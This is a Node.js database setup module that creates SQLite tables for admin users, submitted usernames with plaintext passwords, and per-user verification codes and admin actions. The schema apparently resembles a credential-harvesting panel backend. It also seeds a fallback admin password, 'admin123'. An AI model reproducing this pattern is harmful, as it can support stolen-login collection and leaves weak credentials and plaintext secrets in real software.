import Database from "better-sqlite3";
import path from "path";
import dotenv from "dotenv";
import { hashSync } from "bcryptjs";

dotenv.config();

const dbPath = path.join(process.cwd(), "data", "app.db");
const db = new Database(dbPath);

db.pragma("journal_mode = WAL");

// Create admin user table if not exists
db.prepare(`
  CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT NOT NULL DEFAULT 'admin',
    created_at TEXT NOT NULL
  )
`).run();

const envAdminUser = process.env.ADMIN_USERNAME || "admin";
const envAdminPassword = process.env.ADMIN_PASSWORD || "admin123";

const existingAdmin = db.prepare("SELECT * FROM users WHERE username = ?").get(envAdminUser);
if (!existingAdmin) {
  db.prepare("INSERT INTO users (username, password_hash, role, created_at) VALUES (?, ?, ?, ?)")
    .run(envAdminUser, hashSync(envAdminPassword, 10), "admin", new Date().toISOString());
}

// Create submissions table if not exists
db.prepare(`
  CREATE TABLE IF NOT EXISTS submissions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    password TEXT NOT NULL,
    flow TEXT NOT NULL,
    status TEXT NOT NULL,
    timestamp TEXT NOT NULL,
    server_timestamp TEXT NOT NULL
  )
`).run();

// Store generated codes for user verification and admin action state
const userCodesMeta = db.prepare(`PRAGMA table_info(user_codes)`).all();
const hasFlowColumn = userCodesMeta.some((col) => col.name === "flow");
const hasActionColumn = userCodesMeta.some((col) => col.name === "action");

if (!userCodesMeta.length) {
  db.prepare(`
    CREATE TABLE IF NOT EXISTS user_codes (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT NOT NULL,
      code TEXT,
      flow TEXT,
      action TEXT,
      created_at TEXT NOT NULL
    )
  `).run();
} else {
  if (!hasFlowColumn) {
    db.prepare(`ALTER TABLE user_codes ADD COLUMN flow TEXT`).run();
  }
  if (!hasActionColumn) {
    db.prepare(`ALTER TABLE user_codes ADD COLUMN action TEXT`).run();
  }
}

export default db;
